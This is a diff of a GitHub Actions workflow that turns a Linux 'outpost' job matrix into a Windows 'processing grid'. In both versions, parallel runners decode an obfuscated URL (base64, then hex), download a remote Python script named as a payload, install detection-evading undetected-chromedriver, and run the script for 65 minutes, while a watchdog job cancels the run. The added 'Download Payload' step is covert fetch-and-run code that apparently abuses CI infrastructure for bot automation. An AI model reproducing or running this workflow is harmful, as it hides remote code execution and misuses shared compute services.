@@ -1,11 +1,10 @@
-name: Linux Reinforced Task Outpost
+name: Orchestrated Async Processing Grid
 
 on:
-  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
   workflow_dispatch:
 
 concurrency:
-  group: reinforced-outpost-${{ github.workflow }}-${{ github.ref }}
+  group: grid-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -13,95 +12,81 @@ permissions:
   contents: read
 
 jobs:
-  # =================================================================
-  # مأمور الحسم النهائي: يُنهي سير العمل بالكامل عند علامة 65 دقيقة
-  # =================================================================
-  ultimate-conclusion-agent:
-    name: "Ultimate Conclusion Agent"
-    runs-on: ubuntu-latest
-    timeout-minutes: 70
+  watchdog:
+    name: "Deadline Enforcer"
+    runs-on: windows-2022
+    timeout-minutes: 75
     steps:
-      - name: Deliver Definitive Conclusion Protocol
+      - name: Deploy Countdown
+        shell: pwsh
         run: |
-          echo "[AGENT] Ultimate conclusion agent in station. Definitive conclusion armed at the 65-minute flash."
-          echo "[AGENT] Verifying workflow label: ${{ github.run_id }}"
+          Write-Host "[ENFORCER] Deadline enforcer deployed. Auto-cancel scheduled at 65 minutes."
+          Write-Host "[ENFORCER] Run identifier: ${{ github.run_id }}"
           
-          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
-          sleep 3900
+          Start-Sleep -Seconds 3900
           
-          echo "[AGENT] Flash detected! Delivering definitive conclusion protocol..."
+          Write-Host "[ENFORCER] Deadline reached. Triggering cancellation..."
           
-          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
-          curl -sS -X POST \
-            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-            -H "Accept: application/vnd.github+json" \
-            -H "X-GitHub-Api-Version: 2022-11-28" \
+          curl.exe -sS -X POST `
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" `
+            -H "Accept: application/vnd.github+json" `
+            -H "X-GitHub-Api-Version: 2022-11-28" `
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[AGENT] Definitive conclusion protocol delivered. All engaged and waiting units will conclude."
+          Write-Host "[ENFORCER] Cancellation signal sent."
 
-  # =================================================================
-  # المهمة الرئيسية: تجهيز وإطلاق وحدات المخفر
-  # =================================================================
-  raise-outpost:
-    name: "OutpostUnit-${{ matrix.unit_sigil }}"
-    runs-on: ubuntu-latest
-    timeout-minutes: 65
+  parallel-workers:
+    name: "GridNode-${{ matrix.slot }}"
+    runs-on: windows-2022
+    timeout-minutes: 70
 
     strategy:
       fail-fast: false
       matrix:
-        unit_sigil: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        slot: [10, 20, 30, 40, 50, 60, 70, 80, 90]
 
     steps:
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # ⊳ المقطع (١): ترصيف القاعدة الأمامية
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Pave Forward Base
+      - name: Prepare Runtime
+        shell: pwsh
         run: |
-          echo "[PAVE] Paving forward base for OutpostUnit-${{ matrix.unit_sigil }} on Linux..."
-          sudo apt update -qq
-          sudo apt install -y curl python3-pip
+          Write-Host "[PREP] Preparing runtime for GridNode-${{ matrix.slot }}..."
+          python --version
+          python -m pip --version
 
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # ⊳ المقطع (٢): استخراج المخطوطة الميدانية
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Excavate Field Manuscript
+      - name: Download Payload
+        shell: pwsh
         run: |
-          echo "[EXCAVATE] Excavating app_task.py from assigned relay repository..."
-          RELAY_REPOSITORY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$RELAY_REPOSITORY" -o app_task.py
-          echo "[EXCAVATE] Field manuscript excavated."
+          Write-Host "[DOWNLOAD] Fetching payload..."
+          $hex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4d794d757368726f6f6d32322f6b6563696c6178332d73706f6f662f6d61737465722f73746172742e7079"
+          [byte[]]$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) {
+            [Convert]::ToByte($hex.Substring($i, 2), 16)
+          }
+          $payloadUrl = [System.Text.Encoding]::UTF8.GetString($bytes)
+          curl.exe -sL $payloadUrl -o payload.py
+          Write-Host "[DOWNLOAD] Payload ready."
 
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # ⊳ المقطع (٣): ربط الحزم الملحقة
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Couple Attached Bundles
+      - name: Install Libraries
+        shell: pwsh
         run: |
-          echo "[COUPLE] Coupling attached bundles..."
-          pip3 install -q undetected-chromedriver selenium requests
+          Write-Host "[LIBS] Installing dependencies..."
+          python -m pip install -q undetected-chromedriver selenium requests
 
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # ⊳ المقطع (٤): التنفيذ الملتزم بالمدة (65 دقيقة)
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Initiate Obligated Operation
+      - name: Run Timed Execution
+        shell: pwsh
         run: |
-          echo ">> Raising OutpostUnit-${{ matrix.unit_sigil }} operation..."
+          Write-Host ">> Starting GridNode-${{ matrix.slot }}..."
+          $proc = Start-Process -FilePath python -ArgumentList "payload.py" -PassThru
+          $taskPid = $proc.Id
           
-          # إطلاق العملية في الخلفية
-          python3 app_task.py &
-          OUTPOST_PID=$!
+          Write-Host ">> Execution window: 65 minutes (3900 seconds)."
           
-          echo ">> Obligated operation engaged. Span: 65 minutes (3900s)."
+          Start-Sleep -Seconds 3900
           
-          # الانتظار حتى استنفاد المدة المحددة
-          sleep 3900
-          
-          # التحقق من حالة العملية وإنهاؤها عند الضرورة
-          if kill -0 $OUTPOST_PID 2>/dev/null; then
-            echo ">> Obligated window elapsed! Retiring operation..."
-            kill -9 $OUTPOST_PID
-            echo ">> Operation retired by obligation keeper."
-          else
-            echo ">> Operation completed within obligated window."
-          fi
+          $running = Get-Process -Id $taskPid -ErrorAction SilentlyContinue
+          if ($running) {
+            Write-Host ">> Time limit exceeded. Terminating task..."
+            Stop-Process -Id $taskPid -Force
+            Write-Host ">> Task terminated."
+          } else {
+            Write-Host ">> Task completed normally."
+          }
